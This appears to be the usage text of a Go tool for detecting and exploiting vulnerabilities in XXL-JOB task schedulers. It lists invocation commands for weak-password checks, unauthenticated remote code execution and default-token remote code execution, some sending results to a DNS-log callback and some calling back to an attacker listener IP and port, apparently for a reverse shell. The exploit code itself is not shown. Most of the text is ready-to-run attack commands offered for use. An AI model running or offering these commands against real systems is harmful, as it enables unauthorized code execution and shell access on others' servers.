 xxl-job related vulnerability detection and exploitation tools 
                                                                                      
        week password:                                                                 
                    go run xxl-job.go week -u http://127.0.0.1                         
                                                                                       
        unauthoriztion rce:                                                            
                    go run xxl-job.go unauth -u http://127.0.0.1 -d dnslog.com         
                    go run xxl-job.go unauth -u http://127.0.0.1 -lh ip -lp port       
                                                                                      
        defult token rce:                                                              
                    go run xxl-job.go token -u http://127.0.0.1 -d dnslog.com          
                    go run xxl-job.go token -u http://127.0.0.1 -lh ip -lp port        
                                                                                       
        -p proxy Optional parameters, choose whether to add according to the actual situation 
